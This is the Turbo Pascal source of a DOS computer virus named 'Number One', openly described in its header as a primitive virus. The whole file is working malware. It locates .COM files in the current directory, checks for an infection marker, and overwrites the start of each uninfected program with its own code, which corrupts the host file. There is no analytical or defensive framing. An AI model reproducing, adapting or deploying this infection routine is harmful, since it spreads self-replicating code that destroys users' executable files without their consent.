

{

Number One

   This is a very primitive computer virus written in pascal.

}

{C-}
{U-}
{I-}

Const
  VirusSize  = 12027;
  Warning    : String[42]='This file has been infected by Number One!';

Type
  DTARec     = Record
  DOSnext    : Array[1..21] of Byte;
                   Attr     : Byte;
                   FTime,
                   FDate,
                   FLsize,
                   FHsize   : Integer;
                   FullName : Array[1..13] of Char;
               End;

  Registers = Record
     Case Byte of
     1 : (AX, BX, CX, DX, BP, SI, DI, DS, ES, Flags : Integer);
     2 : (AL, AH, BL, BH, CL, CH, DL, DH            : Byte);
     End;

Var
   ProgramStart   : Byte absolute Cseg:$100;
   MarkInfected   : String[42] absolute Cseg:$180;
   Reg            : Registers;
   DTA            : DTARec;
   Buffer         : Array[Byte] of Byte;
   TestID         : String[42];
   UsePath        : String[66];
   UsePathLength  : Byte absolute UsePath;
   Go             : File;
   B              : Byte;

Begin
  WriteLn(Warning);
  Getdir(0, UsePath);
  if Pos('\', UsePath) <> UsePathLength then
    UsePath := UsePath + '\';
  UsePath := UsePath + '*.COM';
  Reg.AH := $1A;
  Reg.DS := Seg(DTA);
  Reg.DX := Ofs(DTA);
  MsDos(Reg);
  UsePath [Succ(UsePathLength)] :=#0;
  Reg.AH := $4E;
  Reg.DS := Seg(UsePath);
  Reg.DX := Ofs(UsePath[1]);
  Reg.CX := $ff;
  MsDos(Reg);
  IF not Odd(Reg.Flags) Then
    Repeat
      UsePath := DTA.FullName;
      B  := Pos(#0, UsePath);
      If b > 0 Then
        Delete(UsePath, B, 255);
      Assign(Go, UsePath);
      Reset(Go);
      If IOresult = 0 Then
      Begin
        BlockRead(Go, Buffer, 2);
        Move(Buffer[$80], TestID, 43);
        If TestID <> Warning Then
        Begin
          Seek(Go, 0);
          MarkInfected := Warning;
          BlockWrite(Go, ProgramStart, Succ(VirusSize shr 7));
          Close(Go);
          WriteLn(UsePath + ' infected.');
          Halt;
        End;
        Close(Go);
      End;
      Reg.AH := $4F;
      Reg.DS := Seg(DTA);
      Reg.DX := Ofs(DTA);
      MsDos(Reg);
    Until Odd(Reg.Flags);
  Write('  <smile!>  ');
End.



</smile!>